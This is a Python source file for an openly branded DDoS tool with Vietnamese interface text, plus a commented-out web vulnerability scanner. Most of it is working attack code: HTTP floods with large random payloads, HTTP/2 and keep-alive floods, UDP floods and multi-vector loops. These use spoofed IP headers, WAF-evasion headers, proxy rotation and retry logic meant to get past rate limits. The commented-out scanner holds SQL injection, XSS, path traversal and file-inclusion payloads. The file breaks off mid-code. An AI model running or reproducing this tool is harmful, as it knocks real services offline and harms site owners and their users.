#!/usr/bin/env python3

# -*- coding: utf-8 -*-
# ¬©Ô∏è Quang Bao 2025 - All Rights Reserved

import requests
import threading
import multiprocessing
import time
import urllib.parse
import os
import random
import hashlib
import hmac
import json
from datetime import datetime
import socket
import ssl
import whois
import dns.resolver
from bs4 import BeautifulSoup
import sys
import struct
import asyncio
import aiohttp
from concurrent.futures import ThreadPoolExecutor
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.prompt import Prompt, Confirm
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich.theme import Theme
from rich.text import Text
from rich import print as rprint
from rich.layout import Layout
from art import text2art
import platform
import psutil

# Attempt to import h2 for HTTP/2 support
try:
    import h2.connection
    import h2.config
    HTTP2_AVAILABLE = True
except ImportError:
    HTTP2_AVAILABLE = False
    rprint("[yellow][C·∫¢NH B√ÅO] Kh√¥ng t√¨m th·∫•y module 'h2'. T·∫•n c√¥ng HTTP/2 s·∫Ω b·ªã v√¥ hi·ªáu h√≥a. C√†i ƒë·∫∑t b·∫±ng 'pip install h2'[/]")

# Check if running in Codespaces
IS_CODESPACES = os.getenv("CODESPACES") == "true"

# Initialize rich console with enhanced theme
custom_theme = Theme({
    "info": "cyan bold",
    "warning": "yellow bold",
    "error": "red bold",
    "success": "green bold",
    "highlight": "bright_magenta blink",
})
console = Console(theme=custom_theme)

# Enhanced ASCII banner with modern, intricate design
def display_banner():
    banner_text = text2art("QUANG BAO", font="cyberlarge")
    banner = Text(
        f"""
{banner_text}
        ‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó
        ‚ïë        ‚ò†  ULTIMATE DDoS SYSTEM - ELITE EDITION  ‚ò†          ‚ïë
        ‚ïë   [ Powered by Codespaces - NextGen Cyber Warfare 2025 ]    ‚ïë
        ‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù
    üåå TƒÉng t·ªëc t∆∞∆°ng lai, th·ªëng tr·ªã kh√¥ng gian m·∫°ng! üåå
    """, style="success")
    console.print(Panel(banner, title="üî• QUANG BAO CYBER ELITE üî•", border_style="highlight", expand=False))

# Enhanced file integrity check with HMAC-SHA256
SECRET_KEY = b"QuangBao2025Secret"
EXPECTED_HASH = None

def check_file_integrity():
    global EXPECTED_HASH
    try:
        with open(__file__, 'rb') as f:
            file_content = f.read()
            file_hash = hmac.new(SECRET_KEY, file_content, hashlib.sha256).hexdigest()
            if EXPECTED_HASH is None:
                EXPECTED_HASH = file_hash
                console.print(f"[warning][H·ªÜ TH·ªêNG] T·∫°o m√£ bƒÉm HMAC-SHA256 m·ªõi: {file_hash}[/]")
            elif file_hash != EXPECTED_HASH:
                console.print("[error][L·ªñI NGHI√äM TR·ªåNG] T·ªáp b·ªã thay ƒë·ªïi! Tho√°t.[/]")
                exit(1)
    except Exception as e:
        console.print(f"[error][L·ªñI NGHI√äM TR·ªåNG] Ki·ªÉm tra t√≠nh to√†n v·∫πn th·∫•t b·∫°i: {str(e)}[/]")
        exit(1)

# Clear screen
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# Enhanced target selection effect with dynamic progress
def target_selection_effect(target_type):
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        console=console
    ) as progress:
        task = progress.add_task(f"[info]üîí KH√ìA M·ª§C TI√äU: {target_type.upper()}[/]", total=100)
        for i in range(0, 101, 10):
            progress.update(task, advance=10, description=f"[info]üîí KH√ìA M·ª§C TI√äU: {target_type.upper()} [{i}%]...[/]")
            time.sleep(0.2)
        progress.update(task, description=f"[success]‚úÖ M·ª§C TI√äU ƒê√É KH√ìA: {target_type.upper()} [100%]![/]")

# Enhanced loading animation
def loading_animation(message, duration):
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        console=console
    ) as progress:
        task = progress.add_task(f"[info]{message}[/]", total=100)
        for i in range(0, 101, 20):
            progress.update(task, advance=20, description=f"[info]{message} [{i}%]...[/]")
            time.sleep(duration / 5)
        progress.update(task, description=f"[success]{message} [100%]![/]")

# Optimized User-Agent list with more realistic entries
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/109.0 Firefox/109.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
]

# Enhanced random headers with WAF evasion
def generate_random_headers():
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': random.choice(['text/html', 'application/json', '*/*']),
        'Accept-Language': random.choice(['en-US,en;q=0.9', 'vi-VN,vi;q=0.9', 'fr-FR,fr;q=0.8']),
        'Accept-Encoding': random.choice(['gzip, deflate', 'br', 'zstd']),
        'Connection': 'keep-alive',
        'Cache-Control': random.choice(['no-cache', 'max-age=0']),
        'Referer': random.choice(['https://google.com', 'https://bing.com', 'https://duckduckgo.com']),
        'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
        'DNT': random.choice(['1', '0']),
        'CF-Connecting-IP': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
    }
    # Add random headers to confuse WAFs
    if random.random() > 0.5:
        headers['X-Requested-With'] = 'XMLHttpRequest'
    if random.random() > 0.5:
        headers['Origin'] = random.choice(['https://example.com', 'https://test.com'])
    if random.random() > 0.5:
        headers['X-HTTP-Method-Override'] = random.choice(['GET', 'POST'])
    return headers

# Proxy pool with validation
PROXY_LIST = [
    # Add real proxies here, e.g., {"http": "http://proxy:port", "https": "https://proxy:port"}
]
def get_random_proxy():
    if not PROXY_LIST:
        return None
    proxy = random.choice(PROXY_LIST)
    try:
        response = requests.get("https://api.ipify.org", proxies=proxy, timeout=5)
        if response.status_code == 200:
            return proxy
        else:
            console.print(f"[warning][PROXY] Proxy {proxy['http']} kh√¥ng ho·∫°t ƒë·ªông, th·ª≠ proxy kh√°c[/]")
            PROXY_LIST.remove(proxy)
            return get_random_proxy()
    except Exception:
        console.print(f"[warning][PROXY] Proxy {proxy['http']} th·∫•t b·∫°i, th·ª≠ proxy kh√°c[/]")
        PROXY_LIST.remove(proxy)
        return get_random_proxy()

# Random POST data with obfuscation
POST_DATA = {
    "key": random.randint(1, 9999999),
    "value": random.random(),
    "secret": "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=20)),
    "token": hashlib.sha256(str(time.time()).encode()).hexdigest(),
    "attack_vector": random.choice(["destroy", "obliterate", "annihilate", "nuke"]),
}

# Global counters
manager = threading.Lock()
success_count = 0
error_count = 0
response_times = []
blocked_count = {301: 0, 401: 0, 403: 0, 429: 0}

# Validate URL
def validate_url(url):
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    try:
        result = urllib.parse.urlparse(url)
        if not result.scheme or not result.netloc:
            raise ValueError("URL kh√¥ng h·ª£p l·ªá")
        return url
    except Exception as e:
        raise ValueError(f"URL kh√¥ng h·ª£p l·ªá: {e}")

# Save attack configuration
def save_attack_config(url, num_threads, requests_per_thread, target_type):
    config = {
        "url": url,
        "num_threads": num_threads,
        "requests_per_thread": requests_per_thread,
        "target_type": target_type,
        "start_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "codespaces": IS_CODESPACES
    }
    try:
        with open("persistent_attack.json", "w") as f:
            json.dump(config, f)
        console.print(f"[warning][H·ªÜ TH·ªêNG] C·∫•u h√¨nh t·∫•n c√¥ng ƒë√£ l∆∞u: {url}[/]")
    except Exception as e:
        console.print(f"[error][L·ªñI] Kh√¥ng th·ªÉ l∆∞u c·∫•u h√¨nh: {str(e)}[/]")

# Optimize thread/request count for Codespaces
def optimize_for_codespaces(base_threads, base_requests):
    if IS_CODESPACES:
        cpu_count = multiprocessing.cpu_count()
        memory = psutil.virtual_memory().total / (1024 * 1024)  # MB
        if memory < 4096:  # 4GB or less
            return base_threads // 2, base_requests // 2
        elif memory < 8192:  # 8GB
            return base_threads, base_requests
        else:  # 16GB or more
            return base_threads * 2, base_requests * 2
    return base_threads, base_requests

# Assess target security level with block detection
def assess_target_security(url):
    security_level = "TRUNG B√åNH"
    recommended_threads = 3000
    recommended_requests = 3000

    try:
        response = requests.head(url, headers=generate_random_headers(), timeout=5)
        headers = response.headers
        status_code = response.status_code
        waf_indicators = ['cloudflare', 'akamai', 'sucuri', 'incapsula']
        server = headers.get('Server', '').lower()
        cdn_waf_detected = any(waf in server or waf in headers.get('X-Powered-By', '').lower() for waf in waf_indicators)
        rate_limit = 'X-RateLimit-Limit' in headers or status_code in (429, 403)

        domain = urllib.parse.urlparse(url).hostname
        whois_info = whois.whois(domain)
        creation_date = whois_info.get('creation_date')
        if creation_date:
            if isinstance(creation_date, list):
                creation_date = creation_date[0]
            domain_age = (datetime.now() - creation_date).days
        else:
            domain_age = 0

        if cdn_waf_detected or rate_limit or status_code in (301, 401, 403):
            security_level = "CAO"
            recommended_threads = 15000
            recommended_requests = 6000
        elif domain_age > 365:
            security_level = "TRUNG B√åNH"
            recommended_threads = 6000
            recommended_requests = 3000
        else:
            security_level = "TH·∫§P"
            recommended_threads = 1500
            recommended_requests = 1500

        recommended_threads, recommended_requests = optimize_for_codespaces(recommended_threads, recommended_requests)
        console.print(f"[info][H·ªÜ TH·ªêNG] ƒê√°nh gi√° b·∫£o m·∫≠t: {security_level}, Threads: {recommended_threads}, Requests: {recommended_requests}, Status Code: {status_code}[/]")

    except Exception as e:
        console.print(f"[warning][H·ªÜ TH·ªêNG] Kh√¥ng th·ªÉ ƒë√°nh gi√° b·∫£o m·∫≠t: {str(e)}. S·ª≠ d·ª•ng gi√° tr·ªã m·∫∑c ƒë·ªãnh.[/]")
        recommended_threads, recommended_requests = optimize_for_codespaces(3000, 3000)

    return security_level, recommended_threads, recommended_requests

# Adaptive request sender with block bypass
def send_request(url, request_count):
    session = requests.Session()
    methods = ["GET", "POST", "HEAD"]
    retry_attempts = 3
    for _ in range(request_count):
        for attempt in range(retry_attempts):
            try:
                method = random.choice(methods)
                headers = generate_random_headers()
                proxy = get_random_proxy()
                payload = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=random.randint(102400, 204800)))
                start_time = time.time()
                if method == "GET":
                    response = session.get(url, headers=headers, proxies=proxy, timeout=2)
                elif method == "POST":
                    response = session.post(url, data=payload, headers=headers, proxies=proxy, timeout=2)
                else:
                    response = session.head(url, headers=headers, proxies=proxy, timeout=2)
                response_time = (time.time() - start_time) * 1000
                with manager:
                    global success_count, error_count, response_times, blocked_count
                    if response.status_code in (301, 401, 403, 429):
                        blocked_count[response.status_code] += 1
                        console.print(f"[warning][G·ª¨I Y√äU C·∫¶U] M√£ tr·∫°ng th√°i {response.status_code} - Th·ª≠ bypass...[/]")
                        time.sleep(random.uniform(0.5, 2.0))  # Randomized delay to avoid rate-limiting
                        continue
                    success_count += 1
                    response_times.append(response_time)
                console.print(f"[warning][G·ª¨I Y√äU C·∫¶U] T·∫•n c√¥ng: M√£ tr·∫°ng th√°i {response.status_code}[/]")
                break
            except Exception as e:
                with manager:
                    error_count += 1
                console.print(f"[error][G·ª¨I Y√äU C·∫¶U] T·∫•n c√¥ng th·∫•t b·∫°i: {str(e)}[/]")
                time.sleep(random.uniform(0.5, 2.0))  # Randomized delay for retry
            time.sleep(random.uniform(0.0001, 0.001))

# HTTP/2 Multiplexing attack
def http2_multiplexing_attack(url):
    if not HTTP2_AVAILABLE:
        console.print("[error][HTTP/2] T·∫•n c√¥ng b·ªã v√¥ hi·ªáu h√≥a: Ch∆∞a c√†i ƒë·∫∑t module 'h2'[/]")
        return
    parsed_url = urllib.parse.urlparse(url)
    host = parsed_url.hostname
    port = parsed_url.port or 443
    try:
        conn = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
        h2_conn = h2.connection.H2Connection()
        h2_conn.initiate_connection()
        conn.send(h2_conn.data_to_send())
        headers = {
            ':method': 'GET',
            ':path': '/',
            ':scheme': 'https',
            ':authority': host,
            'user-agent': random.choice(USER_AGENTS),
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'accept-encoding': 'gzip, deflate, br',
        }
        while True:
            for stream_id in range(1, 100, 2):
                h2_conn.send_headers(stream_id, headers)
                conn.send(h2_conn.data_to_send())
            response = conn.getresponse()
            response.read()
            with manager:
                global blocked_count
                if response.status in (301, 401, 403, 429):
                    blocked_count[response.status] += 1
                    console.print(f"[warning][HTTP/2] M√£ tr·∫°ng th√°i {response.status} - Th·ª≠ bypass...[/]")
                    time.sleep(random.uniform(0.5, 2.0))
                    continue
            console.print(f"[warning][HTTP/2] T·∫•n c√¥ng: M√£ tr·∫°ng th√°i {response.status}[/]")
            time.sleep(0.001)
    except Exception as e:
        console.print(f"[error][HTTP/2] T·∫•n c√¥ng th·∫•t b·∫°i: {str(e)}[/]")
    finally:
        conn.close()

# Keep-Alive + Pipelining attack
def keep_alive_pipelining_attack(url):
    session = requests.Session()
    headers = generate_random_headers()
    headers['Connection'] = 'keep-alive'
    headers['Keep-Alive'] = 'timeout=5, max=1000'
    proxy = get_random_proxy()
    retry_attempts = 3
    while True:
        for attempt in range(retry_attempts):
            try:
                for _ in range(10):
                    session.get(url, headers=headers, proxies=proxy, timeout=2)
                response = session.get(url, headers=headers, proxies=proxy, timeout=2)
                with manager:
                    global blocked_count
                    if response.status_code in (301, 401, 403, 429):
                        blocked_count[response.status_code] += 1
                        console.print(f"[warning][KEEP-ALIVE] M√£ tr·∫°ng th√°i {response.status_code} - Th·ª≠ bypass...[/]")
                        time.sleep(random.uniform(0.5, 2.0))
                        continue
                console.print(f"[warning][KEEP-ALIVE] T·∫•n c√¥ng: M√£ tr·∫°ng th√°i {response.status_code}[/]")
                break
            except Exception as e:
                console.print(f"[error][KEEP-ALIVE] T·∫•n c√¥ng th·∫•t b·∫°i: {str(e)}[/]")
                time.sleep(random.uniform(0.5, 2.0))
            time.sleep(0.001)

# Unlimited threads attack
def unlimited_threads_attack(url):
    session = requests.Session()
    retry_attempts = 3
    while True:
        for attempt in range(retry_attempts):
            try:
                headers = generate_random_headers()
                proxy = get_random_proxy()
                payload = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=102400))
                response = session.post(url, data=payload, headers=headers, proxies=proxy, timeout=3)
                with manager:
                    global blocked_count
                    if response.status_code in (301, 401, 403, 429):
                        blocked_count[response.status_code] += 1
                        console.print(f"[warning][V√î H·∫†N] M√£ tr·∫°ng th√°i {response.status_code} - Th·ª≠ bypass...[/]")
                        time.sleep(random.uniform(0.5, 2.0))
                        continue
                console.print(f"[error][V√î H·∫†N] T·∫•n c√¥ng: M√£ tr·∫°ng th√°i {response.status_code}[/]")
                break
            except Exception as e:
                console.print(f"[error][V√î H·∫†N] T·∫•n c√¥ng th·∫•t b·∫°i: {str(e)}[/]")
                time.sleep(random.uniform(0.5, 2.0))
            time.sleep(0.001)

# 429/403 Overload attack
def overload_429_403_attack(url, request_count):
    session = requests.Session()
    retry_attempts = 3
    while True:
        for attempt in range(retry_attempts):
            try:
                headers = generate_random_headers()
                proxy = get_random_proxy()
                method = random.choice(["GET", "POST", "HEAD"])
                if method == "GET":
                    response = session.get(url, headers=headers, proxies=proxy, timeout=2)
                elif method == "POST":
                    response = session.post(url, data=POST_DATA, headers=headers, proxies=proxy, timeout=2)
                else:
                    response = session.head(url, headers=headers, proxies=proxy, timeout=2)
                with manager:
                    global blocked_count
                    if response.status_code in (301, 401, 403, 429):
                        blocked_count[response.status_code] += 1
                        console.print(f"[warning][QU√Å T·∫¢I 429/403] M√£ tr·∫°ng th√°i {response.status_code} - Th·ª≠ bypass...[/]")
                        time.sleep(random.uniform(0.5, 2.0))
                        continue
                console.print(f"[warning][QU√Å T·∫¢I 429/403] T·∫•n c√¥ng: M√£ tr·∫°ng th√°i {response.status_code}[/]")
                break
            except Exception as e:
                console.print(f"[error][QU√Å T·∫¢I 429/403] T·∫•n c√¥ng th·∫•t b·∫°i: {str(e)}[/]")
                time.sleep(random.uniform(0.5, 2.0))
            time.sleep(0.0005)

# 522 Blitz attack
def blitz_522_attack(url, request_count):
    session = requests.Session()
    retry_attempts = 3
    while True:
        for attempt in range(retry_attempts):
            try:
                headers = generate_random_headers()
                proxy = get_random_proxy()
                payload = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=204800))
                response = session.post(url, data=payload, headers=headers, proxies=proxy, timeout=1)
                with manager:
                    global blocked_count
                    if response.status_code in (301, 401, 403, 429, 522):
                        blocked_count[response.status_code] += 1
                        console.print(f"[warning][BLITZ 522] M√£ tr·∫°ng th√°i {response.status_code} - Th·ª≠ bypass...[/]")
                        time.sleep(random.uniform(0.5, 2.0))
                        continue
                console.print(f"[warning][BLITZ 522] T·∫•n c√¥ng: M√£ tr·∫°ng th√°i {response.status_code}[/]")
                break
            except Exception as e:
                console.print(f"[error][BLITZ 522] T·∫•n c√¥ng th·∫•t b·∫°i: {str(e)}[/]")
                time.sleep(random.uniform(0.5, 2.0))
            time.sleep(0.0003)

# Combined attack
def combined_all_attack(url, request_count):
    session = requests.Session()
    methods = ["GET", "POST", "HEAD"]
    retry_attempts = 3
    while True:
        for attempt in range(retry_attempts):
            try:
                headers = generate_random_headers()
                proxy = get_random_proxy()
                payload = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=random.randint(102400, 204800)))
                attack_type = random.choice(["flood", "overload", "blitz", "http2", "keep_alive"])
                if attack_type == "flood":
                    response = session.post(url, data=payload, headers=headers, proxies=proxy, timeout=5)
                    with manager:
                        global blocked_count
                        if response.status_code in (301, 401, 403, 429):
                            blocked_count[response.status_code] += 1
                            console.print(f"[warning][K·∫æT H·ª¢P] M√£ tr·∫°ng th√°i {response.status_code} - Th·ª≠ bypass...[/]")
                            time.sleep(random.uniform(0.5, 2.0))
                            continue
                    console.print(f"[error][K·∫æT H·ª¢P] T·∫•n c√¥ng: HTTP Flood - M√£ tr·∫°ng th√°i {response.status_code}[/]")
                elif attack_type == "overload":
                    method = random.choice(methods)
                    if method == "GET":
                        response = session.get(url, headers=headers, proxies=proxy, timeout=2)
                    elif method == "POST":
                        response = session.post(url, data=POST_DATA, headers=headers, proxies=proxy, timeout=2)
                    else:
                        response = session.head(url, headers=headers, proxies=proxy, timeout=2)
                    with manager:
                        global blocked_count
                        if response.status_code in (301, 401, 403, 429):
                            blocked_count[response.status_code] += 1
                            console.print(f"[warning][K·∫æT H·ª¢P] M√£ tr·∫°ng th√°i {response.status_code} - Th·ª≠ bypass...[/]")
                            time.sleep(random.uniform(0.5, 2.0))
                            continue
                    console.print(f"[warning][K·∫æT H·ª¢P] T·∫•n c√¥ng: 429/403 - M√£ tr·∫°ng th√°i {response.status_code}[/]")
                elif attack_type == "blitz":
                    response = session.post(url, data=payload, headers=headers, proxies=proxy, timeout=1)
                    with manager:
                        global blocked_count
                        if response.status_code in (301, 401, 403, 429, 522):
                            blocked_count[response.status_code] += 1
                            console.print(f"[warning][K·∫æT H·ª¢P] M√£ tr·∫°ng th√°i {response.status_code} - Th·ª≠ bypass...[/]")
                            time.sleep(random.uniform(0.5, 2.0))
                            continue
                    console.print(f"[warning][K·∫æT H·ª¢P] T·∫•n c√¥ng: 522 - M√£ tr·∫°ng th√°i {response.status_code}[/]")
                elif attack_type == "http2" and HTTP2_AVAILABLE:
                    http2_multiplexing_attack(url)
                else:
                    keep_alive_pipelining_attack(url)
                break
            except Exception as e:
                console.print(f"[error][K·∫æT H·ª¢P] T·∫•n c√¥ng th·∫•t b·∫°i: {str(e)}[/]")
                time.sleep(random.uniform(0.5, 2.0))
            time.sleep(random.uniform(0.0002, 0.001))

# Layer 3/4 UDP Flood and Amplification attack
def layer3_4_attack(host, port, request_count):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while True:
            payload = os.urandom(random.randint(64, 1400))
            sock.sendto(payload, (host, port))
            console.print(f"[error][UDP FLOOD] G·ª≠i g√≥i tin ƒë·∫øn {host}:{port}[/]")
            time.sleep(0.0001)
    except Exception as e:
        console.print(f"[error][UDP FLOOD] T·∫•n c√¥ng th·∫•t b·∫°i: {str(e)}[/]")
    finally:
        sock.close()

# Multi-vector attack
def multi_vector_attack(url, request_count):
    session = requests.Session()
    methods = ["GET", "POST", "HEAD"]
    retry_attempts = 3
    parsed_url = urllib.parse.urlparse(url)
    host = parsed_url.hostname
    port = parsed_url.port or 80
    while True:
        for attempt in range(retry_attempts):
            try:
                headers = generate_random_headers()
                proxy = get_random_proxy()
                attack_type = random.choice(["flood", "overload", "blitz", "layer3_4", "http2", "keep_alive"])
                if attack_type == "flood":
                    payload = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=random.randint(102400, 204800)))
                    response = session.post(url, data=payload, headers=headers, proxies=proxy, timeout=5)
                    with manager:
                        global blocked_count
                        if response.status_code in (301, 401, 403, 429):
                            blocked_count[response.status_code] += 1
                            console.print(f"[warning][ƒêA VECTOR] M√£ tr·∫°ng th√°i {response.status_code} - Th·ª≠ bypass...[/]")
                            time.sleep(random.uniform(0.5, 2.0))
                            continue
                    console.print(f"[error][ƒêA VECTOR] T·∫•n c√¥ng: HTTP Flood - M√£ tr·∫°ng th√°i {response.status_code}[/]")
                elif attack_type == "overload":
                    method = random.choice(methods)
                    if method == "GET":
                        response = session.get(url, headers=headers, proxies=proxy, timeout=2)
                    elif method == "POST":
                        response = session.post(url, data=POST_DATA, headers=headers, proxies=proxy, timeout=2)
                    else:
                        response = session.head(url, headers=headers, proxies=proxy, timeout=2)
                    with manager:
                        global blocked_count
                        if response.status_code in (301, 401, 403, 429):
                            blocked_count[response.status_code] += 1
                            console.print(f"[warning][ƒêA VECTOR] M√£ tr·∫°ng th√°i {response.status_code} - Th·ª≠ bypass...[/]")
                            time.sleep(random.uniform(0.5, 2.0))
                            continue
                    console.print(f"[warning][ƒêA VECTOR] T·∫•n c√¥ng: M√£ tr·∫°ng th√°i {response.status_code}[/]")
                elif attack_type == "blitz":
                    payload = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=204800))
                    response = session.post(url, data=payload, headers=headers, proxies=proxy, timeout=1)
                    with manager:
                        global blocked_count
                        if response.status_code in (301, 401, 403, 429, 522):
                            blocked_count[response.status_code] += 1
                            console.print(f"[warning][ƒêA VECTOR] M√£ tr·∫°ng th√°i {response.status_code} - Th·ª≠ bypass...[/]")
                            time.sleep(random.uniform(0.5, 2.0))
                            continue
                    console.print(f"[warning][ƒêA VECTOR] T·∫•n c√¥ng: M√£ tr·∫°ng th√°i {response.status_code}[/]")
                elif attack_type == "layer3_4":
                    layer3_4_attack(host, port, request_count)
                elif attack_type == "http2" and HTTP2_AVAILABLE:
                    http2_multiplexing_attack(url)
                else:
                    keep_alive_pipelining_attack(url)
                break
            except Exception as e:
                console.print(f"[error][ƒêA VECTOR] T·∫•n c√¥ng th·∫•t b·∫°i: {str(e)}[/]")
                time.sleep(random.uniform(0.5, 2.0))
            time.sleep(random.uniform(0.0002, 0.001))

# Commented out removed functions to preserve code
"""
# Enhanced Web Vulnerability Scanner
async def scan_vulnerabilities(url):
    vulnerabilities = []
    async with aiohttp.ClientSession() as session:
        try:
            sql_payloads = ["' OR '1'='1", "1; DROP TABLE users --", "' UNION SELECT NULL, NULL --"]
            for payload in sql_payloads:
                async with session.get(f"{url}?id={urllib.parse.quote(payload)}", headers=generate_random_headers(), timeout=5) as response:
                    text = await response.text()
                    if any(error in text.lower() for error in ["sql syntax", "mysql", "database error", "syntax error"]):
                        vulnerabilities.append({
                            "type": "SQL Injection",
                            "severity": "High",
                            "description": f"Ph√°t hi·ªán l·ªó h·ªïng SQL Injection v·ªõi payload: {payload}",
                            "recommendation": "V·ªá sinh v√† x√°c th·ª±c t·∫•t c·∫£ ƒë·∫ßu v√†o, s·ª≠ d·ª•ng c√¢u l·ªánh chu·∫©n b·ªã."
                        })
                        break
        except Exception as e:
            console.print(f"[warning][VULN SCAN] Qu√©t SQL Injection th·∫•t b·∫°i: {str(e)}[/]")

        try:
            xss_payloads = [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')"
            ]
            for payload in xss_payloads:
                async with session.get(f"{url}?q={urllib.parse.quote(payload)}", headers=generate_random_headers(), timeout=5) as response:
                    text = await response.text()
                    if payload in text or "alert('XSS')" in text:
                        vulnerabilities.append({
                            "type": "Cross-Site Scripting (XSS)",
                            "severity": "Medium",
                            "description": f"Ph√°t hi·ªán l·ªó h·ªïng XSS v·ªõi payload: {payload}",
                            "recommendation": "M√£ h√≥a t·∫•t c·∫£ ƒë·∫ßu ra, tri·ªÉn khai CSP."
                        })
                        break
        except Exception as e:
            console.print(f"[warning][VULN SCAN] Qu√©t XSS th·∫•t b·∫°i: {str(e)}[/]")

        try:
            async with session.get(url, headers=generate_random_headers(), timeout=5) as response:
                text = await response.text()
                soup = BeautifulSoup(text, 'html.parser')
                forms = soup.find_all('form')
                for form in forms:
                    if not form.find('input', {'name': lambda x: x and 'csrf' in x.lower()}):
                        vulnerabilities.append({
                            "type": "CSRF",
                            "severity": "Medium",
                            "description": f"Form t·∫°i {form.get('action', 'unknown')} thi·∫øu CSRF token.",
                            "recommendation": "Tri·ªÉn khai CSRF token trong t·∫•t c·∫£ form."
                        })
        except Exception as e:
            console.print(f"[warning][VULN SCAN] Qu√©t CSRF th·∫•t b·∫°i: {str(e)}[/]")

        try:
            traversal_payloads = ["../../etc/passwd", "../config.php", "../../../windows/win.ini"]
            for payload in traversal_payloads:
                async with session.get(f"{url}?file={urllib.parse.quote(payload)}", headers=generate_random_headers(), timeout=5) as response:
                    text = await response.text()
                    if any(indicator in text.lower() for indicator in ["root:", "[extensions]", "password"]):
                        vulnerabilities.append({
                            "type": "Directory Traversal",
                            "severity": "High",
                            "description": f"Ph√°t hi·ªán l·ªó h·ªïng Directory Traversal v·ªõi payload: {payload}",
                            "recommendation": "X√°c th·ª±c v√† v·ªá sinh ƒë∆∞·ªùng d·∫´n t·ªáp, h·∫°n ch·∫ø truy c·∫≠p th∆∞ m·ª•c nh·∫°y c·∫£m."
                        })
                        break
        except Exception as e:
            console.print(f"[warning][VULN SCAN] Qu√©t Directory Traversal th·∫•t b·∫°i: {str(e)}[/]")

        try:
            lfi_payloads = ["php://filter/convert.base64-encode/resource=index.php", "/etc/passwd"]
            for payload in lfi_payloads:
                async with session.get(f"{url}?include={urllib.parse.quote(payload)}", headers=generate_random_headers(), timeout=5) as response:
                    text = await response.text()
                    if any(indicator in text.lower() for indicator in ["php", "root:", "base64"]):
                        vulnerabilities.append({
                            "type": "File Inclusion",
                            "severity": "Critical",
                            "description": f"Ph√°t hi·ªán l·ªó h·ªïng File Inclusion v·ªõi payload: {payload}",
                            "recommendation": "T·∫Øt allow_url_include, x√°c th·ª±c ƒë∆∞·ªùng d·∫´n include."
                        })
                        break
        except Exception as e:
            console.print(f"[warning][VULN SCAN] Qu√©t File Inclusion th·∫•t b·∫°i: {str(e)}[/]")

        try:
            async with session.get(url, headers=generate_random_headers(), timeout=5) as response:
                server = response.headers.get('Server', '')
                x_powered_by = response.headers.get('X-Powered-By', '')
                if server or x_powered_by:
                    vulnerabilities.append({
                        "type": "Server Information Disclosure",
                        "severity": "Low",
                        "description": f"Ti·∫øt l·ªô th√¥ng tin server: Server={server}, X-Powered-By={x_powered_by}",
                        "recommendation": "T·∫Øt header server kh√¥ng c·∫ßn thi·∫øt."
                    })
        except Exception as e:
            console.print(f"[warning][VULN SCAN] Qu√©t header server th·∫•t b·∫°i: {str(e)}[/]")

        try:
            parsed_url = urllib.parse.urlparse(url)
            if parsed_url.scheme == 'https':
                context = ssl.create_default_context()
                with socket.create_connection((parsed_url.hostname, 443)) as sock:
                    with context.wrap_socket(sock, server_hostname=parsed_url.hostname) as ssock:
                        cert = ssock.getpeercert()
                        cipher = ssock.cipher()
                        if cipher[1] in ['TLSv1.0', 'TLSv1.1', 'SSLv3']:
